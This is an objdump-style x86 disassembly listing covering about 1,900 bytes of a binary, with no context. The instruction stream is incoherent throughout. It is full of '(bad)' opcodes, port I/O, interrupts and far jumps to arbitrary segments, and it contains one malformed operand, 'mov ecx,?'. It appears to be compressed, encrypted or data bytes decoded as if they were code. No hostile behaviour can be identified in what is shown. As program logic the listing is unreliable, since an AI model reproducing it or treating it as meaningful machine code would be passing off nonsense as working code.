  41ec93:	sbb    DWORD PTR [ebp+0x3e],0xa604dfa
  41ec9a:	add    ebp,DWORD PTR [esi]
  41ec9c:	rcl    DWORD PTR ds:0xcda803b5,cl
  41eca2:	mov    bh,0x91
  41eca4:	mov    cl,0xb0
  41eca6:	ret    0xa4b1
  41eca9:	(bad)  
  41ecaa:	mov    ch,0x2c
  41ecac:	mov    esi,0x65510430
  41ecb1:	xchg   ebp,eax
  41ecb2:	stos   DWORD PTR es:[edi],eax
  41ecb3:	and    eax,0xf574885f
  41ecb8:	jmp    0x41ed1e
  41ecba:	lock popa 
  41ecbc:	jns    0x41ecf3
  41ecbe:	test   al,0x77
  41ecc0:	cwde   
  41ecc1:	ror    BYTE PTR [esi-0x75525e49],cl
  41ecc7:	push   eax
  41ecc8:	push   esp
  41ecc9:	sar    BYTE PTR [eax-0x3478e667],1
  41eccf:	int    0x2a
  41ecd1:	jne    0x41ec57
  41ecd3:	jb     0x41ed03
  41ecd5:	jge    0x41ed23
  41ecd7:	cmp    BYTE PTR [ebx-0x3ef01848],0xff
  41ecde:	and    esp,DWORD PTR [esi+0x6972f0e]
  41ece4:	xchg   edi,eax
  41ece5:	jmp    0x2c72:0x4fb35e60
  41ecec:	js     0x41eced
  41ecee:	repz call 0x3441a848
  41ecf4:	shr    ebp,1
  41ecf6:	push   es
  41ecf7:	mov    esi,0xa2cbc62b
  41ecfc:	push   0xffffffdd
  41ecfe:	jbe    0x41ecac
  41ed00:	inc    ebp
  41ed01:	add    BYTE PTR [ecx-0x54],ah
  41ed04:	loopne 0x41ecf5
  41ed06:	clc    
  41ed07:	arpl   dx,di
  41ed09:	push   edi
  41ed0a:	popa   
  41ed0b:	mov    ah,0x80
  41ed0d:	pop    esp
  41ed0e:	jg     0x41ed20
  41ed10:	dec    ebx
  41ed11:	(bad)  
  41ed12:	jo     0x41ed35
  41ed14:	pop    edx
  41ed15:	xor    eax,0x57c1bd3c
  41ed1a:	jns    0x41ed6b
  41ed1c:	adc    dh,BYTE PTR [ecx+eiz*8-0xf88b080]
  41ed23:	dec    ecx
  41ed24:	sbb    bl,BYTE PTR [ebx-0x40]
  41ed27:	jbe    0x41eceb
  41ed29:	pushf  
  41ed2a:	aaa    
  41ed2b:	inc    eax
  41ed2c:	pop    eax
  41ed2d:	inc    esp
  41ed2e:	jle    0x41ed04
  41ed30:	cmp    al,0xfe
  41ed32:	std    
  41ed33:	les    esp,FWORD PTR cs:[bp-0xcee]
  41ed39:	push   cs
  41ed3a:	sbb    al,0xfc
  41ed3c:	jmp    0xa045:0x7617b5
  41ed43:	dec    ecx
  41ed44:	(bad)  
  41ed46:	and    bl,0xde
  41ed49:	add    al,0x27
  41ed4b:	mov    ebx,0xf11b517c
  41ed50:	mov    al,ds:0xd64cc44c
  41ed55:	nop
  41ed56:	adc    eax,0x264d1e38
  41ed5b:	add    ah,BYTE PTR [ebp+0x71a55f3a]
  41ed61:	retf   
  41ed62:	inc    esi
  41ed63:	sbb    al,0x97
  41ed65:	lock bound edx,QWORD PTR [ecx-0x72db36d2]
  41ed6c:	scas   al,BYTE PTR es:[edi]
  41ed6d:	mov    al,0xdb
  41ed6f:	lea    esi,[esi+0x41]
  41ed72:	hlt    
  41ed73:	mov    dl,0x73
  41ed75:	inc    ebp
  41ed76:	into   
  41ed77:	pop    eax
  41ed78:	(bad)  
  41ed79:	out    0xcc,eax
  41ed7b:	pop    ds
  41ed7c:	test   eax,0xd48a9df2
  41ed81:	pop    ss
  41ed82:	jne    0x41ed29
  41ed84:	pop    ebx
  41ed85:	add    al,0x42
  41ed87:	mov    ds:0xc51f048e,eax
  41ed8c:	out    dx,eax
  41ed8d:	mov    esp,0x22259088
  41ed92:	mov    al,0xc6
  41ed94:	inc    esp
  41ed95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed96:	stos   DWORD PTR es:[edi],eax
  41ed97:	mov    BYTE PTR [esi+edx*4+0x23],dh
  41ed9b:	into   
  41ed9c:	xchg   ebx,eax
  41ed9d:	data16 add BYTE PTR [ebx+0x1],cl
  41eda1:	jb     0x41ed43
  41eda3:	out    dx,al
  41eda4:	or     dh,dh
  41eda6:	add    esp,DWORD PTR [edx]
  41eda8:	xchg   ecx,eax
  41eda9:	mov    ecx,0x47debf06
  41edae:	xor    bl,BYTE PTR [edx+0x2f326f35]
  41edb4:	xchg   ebx,eax
  41edb5:	pop    es
  41edb6:	aam    0x64
  41edb8:	test   DWORD PTR [ebx-0x60],esi
  41edbb:	mov    ebp,0xcd238bce
  41edc0:	pop    edx
  41edc1:	push   esp
  41edc2:	sbb    al,0x37
  41edc4:	in     eax,dx
  41edc5:	test   eax,0x14f25932
  41edca:	pop    es
  41edcb:	and    DWORD PTR [edi],ecx
  41edcd:	ret    0xd734
  41edd0:	jecxz  0x41edfa
  41edd2:	push   es
  41edd3:	jbe    0x41ee0d
  41edd5:	jmp    0x41ed8e
  41edd7:	inc    esp
  41edd8:	jo     0x41ee03
  41edda:	in     eax,0xbe
  41eddc:	pop    es
  41eddd:	mov    dl,0x11
  41eddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ede0:	inc    edi
  41ede1:	pusha  
  41ede2:	and    al,0x6b
  41ede4:	mov    ebx,0xeeeb0e81
  41ede9:	or     BYTE PTR [ebx],dl
  41edeb:	cdq    
  41edec:	sub    al,BYTE PTR [eax]
  41edee:	inc    edx
  41edef:	jns    0x41ee5c
  41edf1:	rol    BYTE PTR ds:0x50e1572f,cl
  41edf7:	aaa    
  41edf8:	retf   
  41edf9:	cwde   
  41edfa:	dec    esp
  41edfb:	mov    al,ds:0xff7bc4f5
  41ee00:	fsubr  st(6),st
  41ee02:	cs fs mov bl,0x82
  41ee06:	adc    al,0x6
  41ee08:	mov    bh,BYTE PTR [esi]
  41ee0a:	xchg   edi,eax
  41ee0b:	mov    ds:0x68f5ce4,eax
  41ee10:	dec    esp
  41ee11:	or     al,0x50
  41ee13:	in     eax,0xe6
  41ee15:	xchg   ebx,eax
  41ee16:	sub    DWORD PTR [ebp-0x69],0x5d
  41ee1a:	mov    ah,BYTE PTR [di+0x2a]
  41ee1e:	imul   ebp,DWORD PTR [eax],0x1b
  41ee21:	dec    ebx
  41ee22:	push   ebx
  41ee23:	loop   0x41ee93
  41ee25:	push   esp
  41ee26:	lods   eax,DWORD PTR ds:[esi]
  41ee27:	dec    edi
  41ee28:	xchg   esi,eax
  41ee29:	adc    al,0x7d
  41ee2b:	sub    al,0xa9
  41ee2d:	cmp    eax,0x1eea636e
  41ee32:	adc    al,cl
  41ee34:	and    ebx,DWORD PTR [eax-0x3f8adf66]
  41ee3a:	mov    ecx,0x9e44d24a
  41ee3f:	and    BYTE PTR [ebx-0x33719ec9],al
  41ee45:	into   
  41ee46:	push   ecx
  41ee47:	mov    edx,DWORD PTR [ebx+0x24]
  41ee4a:	dec    eax
  41ee4b:	mov    ch,0x35
  41ee4d:	loop   0x41edde
  41ee4f:	shr    BYTE PTR [ebp+0x4b],1
  41ee52:	mov    al,0xb5
  41ee54:	mov    ebp,0x377c24e9
  41ee59:	push   ecx
  41ee5a:	mov    bl,0x5f
  41ee5c:	and    ch,BYTE PTR ss:[edi+eax*8-0x50]
  41ee61:	pop    es
  41ee62:	mov    ch,0x13
  41ee64:	sub    eax,0xdcf46eac
  41ee69:	mov    ecx,0x99238f48
  41ee6e:	dec    edx
  41ee6f:	shr    DWORD PTR [ebx-0x51],cl
  41ee72:	(bad)  
  41ee73:	cmc    
  41ee74:	fnstsw WORD PTR [ebp-0x6376a98b]
  41ee7a:	xchg   ch,al
  41ee7c:	out    dx,al
  41ee7d:	ss retf 
  41ee7f:	rol    BYTE PTR [ebx],1
  41ee81:	pop    ss
  41ee82:	push   ebx
  41ee83:	jne    0x41ef04
  41ee85:	lods   eax,DWORD PTR ds:[esi]
  41ee86:	push   ss
  41ee87:	cwde   
  41ee88:	cwde   
  41ee89:	mov    ebp,0x250f5270
  41ee8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee8f:	test   BYTE PTR [eax-0x5be2f11],dh
  41ee95:	in     al,dx
  41ee96:	(bad)  
  41ee97:	stos   DWORD PTR es:[edi],eax
  41ee98:	pop    esp
  41ee99:	mov    ds:0x73520279,eax
  41ee9e:	inc    ecx
  41ee9f:	sbb    BYTE PTR [edx-0x4f],ah
  41eea2:	aas    
  41eea3:	enter  0x3be2,0x9d
  41eea7:	aas    
  41eea8:	pop    esp
  41eea9:	cmp    eax,0xcbdb4620
  41eeae:	sub    ecx,DWORD PTR [edi]
  41eeb0:	mov    ds:0x8fd4fea2,al
  41eeb5:	pop    ecx
  41eeb6:	adc    ah,BYTE PTR [ecx+0x4dedfc80]
  41eebc:	(bad)  
  41eebd:	xchg   edx,eax
  41eebe:	add    eax,0x5c6a43ea
  41eec3:	dec    edx
  41eec4:	sti    
  41eec5:	mov    eax,0x799a6ffa
  41eeca:	jmp    DWORD PTR [edi-0x5b403e9c]
  41eed0:	ja     0x41ef35
  41eed2:	das    
  41eed3:	dec    ebx
  41eed4:	out    dx,eax
  41eed5:	cmp    dh,BYTE PTR [edi-0x46]
  41eed8:	and    edi,DWORD PTR [edx]
  41eeda:	aas    
  41eedb:	sar    DWORD PTR [eax-0x67],1
  41eede:	mov    bh,0xca
  41eee0:	push   0x4d
  41eee2:	xor    eax,0x36
  41eee5:	sbb    eax,0x442c2e0e
  41eeea:	(bad)  
  41eeeb:	repnz loopne 0x41ef67
  41eeee:	scas   al,BYTE PTR es:[edi]
  41eeef:	test   ebx,ebx
  41eef1:	mov    BYTE PTR [eax+0x144d8e85],cl
  41eef7:	stc    
  41eef8:	je     0x41ee8f
  41eefa:	in     al,0x95
  41eefc:	gs inc esp
  41eefe:	jle    0x41ef4b
  41ef00:	inc    esp
  41ef01:	inc    eax
  41ef02:	dec    esp
  41ef03:	pop    edi
  41ef04:	add    eax,0x51242bfc
  41ef09:	mov    al,ds:0x7d5841c5
  41ef0e:	xlat   BYTE PTR ds:[ebx]
  41ef0f:	xchg   ebx,eax
  41ef10:	das    
  41ef11:	jg     0x41eecd
  41ef13:	inc    ecx
  41ef14:	add    DWORD PTR [esi-0x7ad52970],ecx
  41ef1a:	stos   BYTE PTR es:[edi],al
  41ef1b:	ret    0x47f7
  41ef1e:	sbb    bl,BYTE PTR [ecx+0x5]
  41ef21:	pushf  
  41ef22:	jg     0x41eefc
  41ef24:	in     eax,dx
  41ef25:	scas   al,BYTE PTR es:[edi]
  41ef26:	or     ecx,DWORD PTR [ecx-0x26]
  41ef29:	cmc    
  41ef2a:	jns    0x41eeb4
  41ef2c:	daa    
  41ef2d:	cmp    dh,ah
  41ef2f:	and    ax,0xe6c4
  41ef33:	int3   
  41ef34:	push   cs
  41ef35:	mov    dh,0x79
  41ef37:	(bad)  
  41ef38:	sbb    al,0x40
  41ef3a:	mov    ch,0xca
  41ef3c:	test   al,0x73
  41ef3e:	xlat   BYTE PTR ds:[ebx]
  41ef3f:	jmp    0xe7c66151
  41ef44:	test   DWORD PTR [ebx+0x551e3d03],edi
  41ef4a:	mov    gs,WORD PTR [ecx-0x40]
  41ef4d:	aad    0x70
  41ef4f:	fs and eax,0x46a4a18e
  41ef55:	add    ebp,DWORD PTR [ebx-0x3a]
  41ef58:	pop    eax
  41ef59:	aaa    
  41ef5a:	lods   al,BYTE PTR ds:[esi]
  41ef5b:	loopne 0x41ef3e
  41ef5d:	jp     0x41ef3f
  41ef5f:	sbb    bh,0x8b
  41ef62:	fldenv [edi-0x3c]
  41ef65:	aam    0xd7
  41ef67:	mov    al,ds:0x3f5db42a
  41ef6c:	pop    esi
  41ef6d:	arpl   WORD PTR [eax],bp
  41ef6f:	std    
  41ef70:	mov    dh,0xa9
  41ef72:	pop    esp
  41ef73:	jmp    0x41ef9e
  41ef75:	aam    0x29
  41ef77:	xchg   ebp,eax
  41ef78:	jno    0x41ef14
  41ef7a:	imul   esi,DWORD PTR [edi-0x12],0x9a58e87
  41ef81:	cmc    
  41ef82:	mov    ebp,0x9013c5bf
  41ef87:	mov    esi,0x90a46aa1
  41ef8c:	call   0x8ec6:0x469f289b
  41ef93:	mov    eax,0x6b1292bb
  41ef98:	sub    bh,BYTE PTR [eax+eax*8+0x7f]
  41ef9c:	jns    0x41ef59
  41ef9e:	add    eax,0x7179b92
  41efa3:	xor    BYTE PTR [edi],dl
  41efa5:	xchg   bh,bh
  41efa7:	scas   al,BYTE PTR es:[edi]
  41efa8:	popf   
  41efa9:	sbb    al,0xc2
  41efab:	fwait
  41efac:	loop   0x41efbc
  41efae:	or     DWORD PTR [edi],edx
  41efb0:	mov    DWORD PTR [edx],esi
  41efb2:	adc    eax,0x55b5c267
  41efb7:	sbb    bh,BYTE PTR [edx]
  41efb9:	mov    esi,0xa98a56f2
  41efbe:	mov    dh,0x51
  41efc0:	mov    ecx,0xb6aa14c2
  41efc5:	fs aad 0x5c
  41efc8:	rcl    bl,0xe0
  41efcb:	stc    
  41efcc:	rcr    ch,cl
  41efce:	out    dx,eax
  41efcf:	jne    0x41efa4
  41efd1:	(bad)  
  41efd2:	in     al,0xb4
  41efd4:	pop    es
  41efd5:	stc    
  41efd6:	call   0xe94b:0x81625e07
  41efdd:	add    ebp,eax
  41efdf:	rcl    BYTE PTR [eax-0x2f1bca02],0x52
  41efe6:	push   esi
  41efe7:	call   0xe4c3dff
  41efec:	arpl   ax,si
  41efee:	xor    DWORD PTR [ebx-0x4d4fac95],ebx
  41eff4:	pusha  
  41eff5:	imul   esi,eax,0xffffffe5
  41eff8:	push   esi
  41eff9:	loope  0x41f039
  41effb:	inc    ebp
  41effc:	dec    esp
  41effd:	jecxz  0x41f074
  41efff:	jmp    0x41f056
  41f001:	stc    
  41f002:	clc    
  41f003:	inc    esi
  41f004:	pop    ds
  41f005:	ret    
  41f006:	pop    ebp
  41f007:	imul   edi,DWORD PTR ds:0xf1809c3f,0x3505602c
  41f011:	(bad)
  41f014:	xchg   esi,eax
  41f015:	call   0x9175:0x2f5aa882
  41f01c:	mov    ebx,0xe00927da
  41f021:	mov    ah,ch
  41f023:	push   ecx
  41f024:	(bad)  
  41f026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f027:	cmp    DWORD PTR [eax],edx
  41f029:	sub    bh,BYTE PTR [ecx-0x32acbdd6]
  41f02f:	jle    0x41f00b
  41f031:	retf   0x80b8
  41f034:	leave  
  41f035:	sbb    DWORD PTR [ebp-0x53],0x387c0813
  41f03c:	xchg   ecx,eax
  41f03d:	and    WORD PTR [eax+0x229f964c],cx
  41f044:	pop    es
  41f045:	retf   
  41f046:	cmp    edx,esp
  41f048:	jg     0x41f09a
  41f04a:	and    dh,ch
  41f04c:	(bad)  
  41f04d:	xor    bh,BYTE PTR ds:0x3b2ef37b
  41f053:	mov    ecx,?
  41f055:	mov    bh,0x4b
  41f057:	jg     0x41f03b
  41f059:	repnz lods eax,DWORD PTR ds:[esi]
  41f05b:	and    bh,BYTE PTR [ebp+0x5f]
  41f05e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f05f:	push   eax
  41f060:	or     BYTE PTR [edx-0x73],0x26
  41f064:	jns    0x41effc
  41f066:	push   ecx
  41f067:	push   cs
  41f068:	mov    ecx,0x9b83e4ad
  41f06d:	jle    0x41f0db
  41f06f:	mov    bh,0x96
  41f071:	(bad)  
  41f072:	and    ah,BYTE PTR [eax+0x4f]
  41f075:	jle    0x41f0b8
  41f077:	clc    
  41f078:	fldenv [ebp+0x19]
  41f07b:	mov    ah,0x33
  41f07d:	xchg   ecx,eax
  41f07e:	retf   
  41f07f:	and    eax,0xbd3f0977
  41f084:	cmp    al,BYTE PTR [ecx]
  41f086:	leave  
  41f087:	push   ecx
  41f088:	pop    ss
  41f089:	mov    ds:0x3bd0f12a,al
  41f08e:	int    0xda
  41f090:	xchg   ebp,eax
  41f091:	lahf   
  41f092:	mov    al,ds:0x59acfcd3
  41f097:	mov    dl,0xc3
  41f099:	into   
  41f09a:	jmp    0x9fb2:0xa506fd58
  41f0a1:	cmp    eax,0x58151e91
  41f0a6:	mov    esp,0x4adf9186
  41f0ab:	int3   
  41f0ac:	or     al,0xa
  41f0ae:	and    al,BYTE PTR [ebx+0x2c]
  41f0b1:	cli    
  41f0b2:	xlat   BYTE PTR ds:[ebx]
  41f0b3:	xor    al,BYTE PTR [edx]
  41f0b5:	or     eax,0x4c5d728d
  41f0ba:	or     al,0x64
  41f0bc:	xchg   DWORD PTR [esp+esi*2+0x11],esp
  41f0c0:	push   ebp
  41f0c1:	std    
  41f0c2:	mov    ecx,0xff57b89c
  41f0c7:	lds    esi,FWORD PTR [eax]
  41f0c9:	cmp    eax,0x8f6acd1
  41f0ce:	pop    esp
  41f0cf:	jmp    0xf9bbe51b
  41f0d4:	clc    
  41f0d5:	lds    edi,FWORD PTR [ecx+0x2b]
  41f0d8:	(bad)  
  41f0d9:	push   ss
  41f0da:	and    eax,0x88494795
  41f0df:	dec    edx
  41f0e0:	jns    0x41f141
  41f0e2:	iret   
  41f0e3:	stc    
  41f0e4:	aaa    
  41f0e5:	(bad)  
  41f0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0e7:	add    al,0xf0
  41f0e9:	sub    ecx,edi
  41f0eb:	popw   ds
  41f0ed:	ret    0x21f6
  41f0f0:	sub    esp,DWORD PTR [ebx]
  41f0f2:	repnz add BYTE PTR [esi+0x6e],bh
  41f0f6:	outs   dx,DWORD PTR ds:[esi]
  41f0f7:	pop    ebx
  41f0f8:	push   0xffffffe5
  41f0fa:	cmp    ebx,DWORD PTR [ebx]
  41f0fc:	popf   
  41f0fd:	js     0x41f139
  41f0ff:	je     0x41f0e8
  41f101:	retf   
  41f102:	pop    ebp
  41f103:	bound  esi,QWORD PTR [eax]
  41f105:	adc    BYTE PTR [ebx],dl
  41f107:	mov    cl,0x95
  41f109:	push   0x95805528
  41f10e:	out    dx,eax
  41f10f:	stos   BYTE PTR es:[edi],al
  41f110:	dec    eax
  41f111:	adc    eax,DWORD PTR [eax]
  41f113:	pusha  
  41f114:	call   0x7a15889f
  41f119:	jnp    0x41f0a5
  41f11b:	xor    al,0xb7
  41f11d:	outs   dx,DWORD PTR ds:[esi]
  41f11e:	sub    BYTE PTR [eax+0x2a8601e0],0xc7
  41f125:	loope  0x41f0d6
  41f127:	lock or BYTE PTR [edi+0x52],dl
  41f12b:	leave  
  41f12c:	cmp    DWORD PTR [edx],eax
  41f12e:	mov    esi,edx
  41f130:	out    dx,al
  41f131:	jbe    0x41f1a6
  41f133:	add    DWORD PTR [edx+ecx*8],eax
  41f136:	push   ss
  41f137:	(bad)  
  41f138:	jecxz  0x41f19d
  41f13a:	ret    
  41f13b:	mov    ecx,0x408dc199
  41f140:	arpl   WORD PTR [edx],di
  41f142:	adc    al,BYTE PTR [esi+edi*2+0x62]
  41f146:	call   0x20d6:0x42dd6001
  41f14d:	pop    ebx
  41f14e:	ret    0x3c1e
  41f151:	jbe    0x41f182
  41f153:	or     cl,BYTE PTR ds:0xf26fdaf
  41f159:	cs dec ebx
  41f15b:	loop   0x41f131
  41f15d:	rol    BYTE PTR ds:0xda08900b,1
  41f163:	retf   
  41f164:	inc    edx
  41f165:	hlt    
  41f166:	in     al,0x3c
  41f168:	in     al,dx
  41f169:	xlat   BYTE PTR ds:[ebx]
  41f16a:	jo     0x41f179
  41f16c:	std    
  41f16d:	xchg   esi,eax
  41f16e:	lea    eax,[ecx+0x380acb5f]
  41f174:	pop    ecx
  41f175:	test   BYTE PTR [bp+si+0x5df1],bl
  41f17a:	int3   
  41f17b:	cwde   
  41f17c:	or     ch,BYTE PTR [ebp+0x53]
  41f17f:	jne    0x41f1e4
  41f181:	and    dl,BYTE PTR [edx]
  41f183:	jmp    0xb259:0x3d3afb2c
  41f18a:	mov    cl,0x7e
  41f18c:	or     esi,ebp
  41f18e:	push   ds
  41f18f:	je     0x41f185
  41f191:	retf   0x9049
  41f194:	lahf   
  41f195:	retf   
  41f196:	push   ds
  41f197:	(bad)  
  41f198:	jmp    0x24c5:0x45fba7e9
  41f19f:	fdiv   DWORD PTR [esi+0x7b]
  41f1a2:	and    eax,0x78b704bf
  41f1a7:	push   0x2448899d
  41f1ac:	inc    edx
  41f1ad:	inc    ecx
  41f1ae:	lods   al,BYTE PTR ds:[esi]
  41f1af:	and    BYTE PTR [eax-0x6e444460],cl
  41f1b5:	push   edx
  41f1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1b7:	mov    dh,0x20
  41f1b9:	fmul   DWORD PTR [edx-0x20dae17e]
  41f1bf:	nop
  41f1c0:	mov    ds:0x7a46f059,eax
  41f1c5:	jge    0x41f16b
  41f1c7:	loopne 0x41f1bc
  41f1c9:	int    0xc3
  41f1cb:	mov    ch,0x55
  41f1cd:	out    0x69,eax
  41f1cf:	push   ebx
  41f1d0:	and    ebx,DWORD PTR [edx+0x2d]
  41f1d3:	(bad)  
  41f1d5:	lods   al,BYTE PTR ds:[esi]
  41f1d6:	pop    es
  41f1d7:	mov    dh,0x47
  41f1d9:	retf   
  41f1da:	push   esi
  41f1db:	dec    eax
  41f1dc:	mov    ebp,0x2bd3e003
  41f1e1:	add    eax,edi
  41f1e3:	outs   dx,DWORD PTR ds:[esi]
  41f1e4:	test   DWORD PTR [edx-0x656aff3d],esi
  41f1ea:	xor    al,0x28
  41f1ec:	or     esi,esi
  41f1ee:	stos   DWORD PTR es:[edi],eax
  41f1ef:	jmp    0x41f1ea
  41f1f1:	adc    BYTE PTR [ecx-0x28],bl
  41f1f4:	test   DWORD PTR [ebx+0x8822380],ecx
  41f1fa:	in     eax,0xf9
  41f1fc:	push   ebx
  41f1fd:	xchg   ecx,eax
  41f1fe:	hlt    
  41f1ff:	and    eax,DWORD PTR [esp+0x1b]
  41f203:	sbb    al,BYTE PTR [ebx]
  41f205:	pushf  
  41f206:	xlat   BYTE PTR ds:[ebx]
  41f207:	lahf   
  41f208:	add    ebx,DWORD PTR ds:0x20e9096b
  41f20e:	mov    ah,0xe3
  41f210:	sub    BYTE PTR [edx],0xc7
  41f213:	jl     0x41f21f
  41f215:	test   al,0x9d
  41f217:	in     al,0x4f
  41f219:	mov    eax,ds:0xe876841a
  41f21e:	dec    ecx
  41f21f:	in     al,dx
  41f220:	imul   ebx,DWORD PTR [ecx-0x623adbd6],0x28
  41f227:	in     al,dx
  41f228:	mov    cs,WORD PTR [edi-0x1b]
  41f22b:	mov    esp,0x12b1944
  41f230:	dec    esi
  41f231:	out    dx,al
  41f232:	cli    
  41f233:	je     0x41f280
  41f235:	cmp    dh,BYTE PTR [edx+0x4e]
  41f238:	or     eax,0xae140491
  41f23d:	stc    
  41f23e:	xchg   edx,eax
  41f23f:	pop    esp
  41f240:	push   esp
  41f241:	jmp    0x2d12183f
  41f246:	xor    DWORD PTR [ecx+eiz*4],eax
  41f249:	sub    dh,ch
  41f24b:	aad    0x9d
  41f24d:	mov    ah,0x3f
  41f24f:	jge    0x41f26b
  41f251:	fsubr  DWORD PTR [esi-0x63]
  41f254:	mov    ebp,0x1286571
  41f259:	jo     0x41f2d2
  41f25b:	xor    ebp,DWORD PTR [esi+edx*4]
  41f25e:	rol    DWORD PTR [edx-0x67f1791f],0x4f
  41f265:	repnz mov ss,edi
  41f268:	loopne 0x41f287
  41f26a:	cwde   
  41f26b:	push   ecx
  41f26c:	loope  0x41f295
  41f26e:	stos   BYTE PTR es:[edi],al
  41f26f:	mov    eax,0x97925536
  41f274:	clc    
  41f275:	xor    DWORD PTR [esp+esi*4],ecx
  41f278:	push   esi
  41f279:	aam    0x1e
  41f27b:	pop    edx
  41f27c:	adc    BYTE PTR [edi-0x38],0x62
  41f280:	fwait
  41f281:	push   esi
  41f282:	cmp    dh,cl
  41f284:	ret    
  41f285:	jbe    0x41f24e
  41f287:	push   es
  41f288:	cmc    
  41f289:	(bad)  
  41f28a:	and    eax,0x704b2bba
  41f28f:	ds sahf 
  41f291:	push   ebp
  41f292:	mov    eax,ds
  41f294:	scas   eax,DWORD PTR es:[edi]
  41f295:	adc    al,0xde
  41f297:	jbe    0x41f285
  41f299:	les    esi,FWORD PTR [edx-0x46]
  41f29c:	pop    ebx
  41f29d:	loop   0x41f2d2
  41f29f:	inc    edi
  41f2a0:	adc    eax,0x803ec6c9
  41f2a5:	push   ecx
  41f2a6:	xchg   esi,eax
  41f2a7:	jbe    0x41f22a
  41f2a9:	or     al,0x10
  41f2ab:	jbe    0x41f2fc
  41f2ad:	xor    BYTE PTR [ebx-0x287c5bf7],dh
  41f2b3:	cmp    ebx,DWORD PTR [ebx+0x54]
  41f2b6:	sbb    BYTE PTR [eax+0x3b12b616],bh
  41f2bc:	call   0xcd11b4a
  41f2c1:	xor    eax,0x21d5f1e6
  41f2c6:	pop    edx
  41f2c7:	sbb    DWORD PTR [ebx+0x31],ecx
  41f2ca:	nop
  41f2cb:	dec    edi
  41f2cc:	push   DWORD PTR [eax]
  41f2ce:	cmc    
  41f2cf:	jmp    DWORD PTR [ebp+0x1a83a264]
  41f2d5:	das    
  41f2d6:	mov    dh,0xa6
  41f2d8:	retf   0x58c2
  41f2db:	cmp    DWORD PTR [edi*2+0x5d6212ca],edi
  41f2e2:	mov    ds:0xe14d9766,al
  41f2e7:	jmp    0xfe138c48
  41f2ec:	adc    al,0xd3
  41f2ee:	xor    esi,DWORD PTR [eax-0x3911b65]
  41f2f4:	cmp    al,0x51
  41f2f6:	sub    bh,bl
  41f2f8:	sub    ch,al
  41f2fa:	das    
  41f2fb:	jecxz  0x41f29c
  41f2fd:	add    BYTE PTR [ebp-0x30],0x58
  41f301:	stos   BYTE PTR es:[edi],al
  41f302:	xor    DWORD PTR ds:0xe484def9,edx
  41f308:	out    0xfd,al
  41f30a:	loope  0x41f306
  41f30c:	arpl   WORD PTR [edx+0x18a5b2b1],ax
  41f312:	jne    0x41f2c5
  41f314:	repz sub ecx,DWORD PTR [ebx+0x33ee06d7]
  41f31b:	fstp   TBYTE PTR [edx-0x59237767]
  41f321:	fcom   DWORD PTR [ebx+ecx*8+0xe500900]
  41f328:	pop    ebx
  41f329:	cdq    
  41f32a:	cmp    bh,BYTE PTR [ebx+0x43]
  41f32d:	clc    
  41f32e:	cmp    DWORD PTR [esi+0x31f4977a],esp
  41f334:	(bad)  
  41f335:	ins    DWORD PTR es:[edi],dx
  41f336:	jo     0x41f3b1
  41f338:	test   ecx,edx
  41f33a:	addr16 test bh,cl
  41f33d:	sub    ecx,DWORD PTR [ecx]
  41f33f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f340:	cli    
  41f341:	aas    
  41f342:	inc    edx
  41f343:	or     edx,DWORD PTR [esi-0x7a]
  41f346:	dec    esi
  41f347:	(bad)  [edx+eiz*8]
  41f34a:	mov    edx,0x8d9cb179
  41f34f:	push   edx
  41f350:	daa    
  41f351:	cmp    BYTE PTR [edi+0x2a],bh
  41f354:	or     al,0x11
  41f356:	and    ch,BYTE PTR [edx-0xb]
  41f359:	xor    DWORD PTR [edx+0x79],edx
  41f35c:	shl    DWORD PTR [edx-0x66],1
  41f35f:	cmp    BYTE PTR [ebp-0x45fe8eac],al
  41f365:	fld    QWORD PTR [ebx-0x1433156b]
  41f36b:	push   ss
  41f36c:	jne    0x41f320
  41f36e:	std    
  41f36f:	lods   al,BYTE PTR ds:[esi]
  41f370:	sar    BYTE PTR [ecx],cl
  41f372:	call   0xb32:0x606c7bd5
  41f379:	stc    
  41f37a:	push   0xffffff9a
  41f37c:	xor    ah,BYTE PTR [esi]
  41f37e:	xchg   edi,eax
  41f37f:	pop    ecx
  41f380:	jo     0x41f390
  41f382:	int3   
  41f383:	mov    al,ds:0x5d73dc17
  41f388:	stos   DWORD PTR es:[edi],eax
  41f389:	lods   eax,DWORD PTR ds:[esi]
  41f38a:	xor    al,0xbe
  41f38c:	jmp    0x41f382
  41f38e:	xor    eax,0x3c263d12
  41f393:	stc    
  41f394:	or     DWORD PTR cs:0xa75e0bf7,0x5702e6bb
  41f39f:	mov    ebx,0xcab14531
  41f3a4:	push   edi
  41f3a5:	int3   
  41f3a6:	jae    0x41f3b8
  41f3a8:	mov    DWORD PTR [ecx*8+0x461df8d8],ebp
  41f3af:	mov    al,0x9e
  41f3b1:	test   eax,0xbee69c19
  41f3b6:	retf   0xd72d
  41f3b9:	sub    al,0xd8
  41f3bb:	pop    ebx
  41f3bc:	hlt    
  41f3bd:	mov    ds:0xcd7459ab,al
  41f3c2:	sti    
  41f3c3:	fsub   st,st(4)
  41f3c5:	mov    ah,0x72
  41f3c7:	push   es
  41f3c8:	jmp    0x346c:0xc20da3c6
  41f3cf:	add    DWORD PTR [esi-0x30],0x20
  41f3d3:	sub    BYTE PTR [ebx],0xe8
  41f3d6:	(bad)  
  41f3d7:	dec    ebx
  41f3d8:	cmp    edx,DWORD PTR [edi+esi*1-0x28486f23]
  41f3df:	and    DWORD PTR [edi+0x4b40785],0xffffff86
  41f3e6:	arpl   WORD PTR [edx],di
  41f3e8:	jecxz  0x41f42c
  41f3ea:	dec    eax
  41f3eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3ec:	pop    ebx
  41f3ed:	mov    dl,ch
  41f3ef:	mov    ebx,0xdbfa1396
  41f3f4:	fiadd  DWORD PTR [eax]
  41f3f6:	test   BYTE PTR [edi-0x4f],cl
  41f3f9:	pop    ss
  41f3fa:	dec    edi
  41f3fb:	mov    cx,0xea85
  41f3ff:	ja     0x41f3ba
  41f401:	packssdw mm0,QWORD PTR [eax]
  41f404:	sar    DWORD PTR [ecx],0x57
  41f407:	sub    al,0x83
  41f409:	aas    
  41f40a:	fwait
